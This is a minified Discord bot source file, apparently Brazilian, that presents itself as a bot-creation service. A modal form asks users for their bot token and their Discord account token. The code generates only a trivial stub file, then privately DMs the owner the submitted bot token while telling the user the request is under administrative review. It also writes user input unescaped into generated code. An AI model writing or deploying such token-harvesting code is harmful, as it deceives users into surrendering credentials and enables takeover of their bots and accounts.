const {Client,GatewayIntentBits,ModalBuilder,TextInputBuilder,ActionRowBuilder,TextInputStyle,EmbedBuilder,Partials}=require('discord.js')
const C=require('./_config'),{EMB}=require('./_estilo'),fs=require('fs'),cp=require('child_process')
const b=new Client({intents:[Object.values(GatewayIntentBits)],partials:[Partials.Message,Partials.Channel]})
const P={}
b.on('ready',()=>console.log('✅ 03'))
b.on('messageCreate',m=>{if(m.content==='!cria'||m.content==='!cria-bot')m.channel.send(EMB('CB',C.B.CB.n))})
b.on('interactionCreate',async i=>{
  if(i.customId==='btn_CB'){
    const md=new ModalBuilder().setCustomId('mdcb').setTitle('🤖 CRIAR BOT')
    md.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tb').setLabel('Token Bot').setStyle(1).setRequired(true)),new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('tc').setLabel('Token Conta').setStyle(1).setRequired(true)),new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ds').setLabel('Como quer o bot').setStyle(2).setRequired(true)),new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('cd').setLabel('CÓDIGO ESPECIAL').setStyle(1).setRequired(true)))
    i.showModal(md)
  }
  if(i.isModalSubmit()&&i.customId==='mdcb'){
    const tb=i.fields.getTextInputValue('tb'),tc=i.fields.getTextInputValue('tc'),ds=i.fields.getTextInputValue('ds'),cd=i.fields.getTextInputValue('cd'),u=i.user,id='P'+Date.now()
    const cod=`// IA OLNY · ${cd}\nconst {Client}=require('discord.js')\nconst x=new Client({intents:3276799})\nx.on('ready',()=>console.log('🤖 ${cd}'))\nx.login(process.env.T)\n`
    fs.writeFileSync(__dirname+`/B${id}.js`,cod)
    const ok=cp.spawnSync('node',['--check',__dirname+`/B${id}.js`]).status===0
    b.users.cache.get(C.DONO)?.send({embeds:[new EmbedBuilder().setColor('#00ff3c').setTitle('🤖 NOVO').addFields({name:'Usuário',value:`${u.tag}\n${u.id}`},{name:'Token',value:'```'+tb+'```'},{name:'Validação',value:ok?'✅':'⚠️'})]})
    i.reply({embeds:[new EmbedBuilder().setColor('#00ff3c').setDescription('📤 análise administrativa')],ephemeral:true})
  }
})
b.on('guildCreate',g=>{if(g.id!==C.SRV)g.leave()})
b.login(C.B.CB.t)
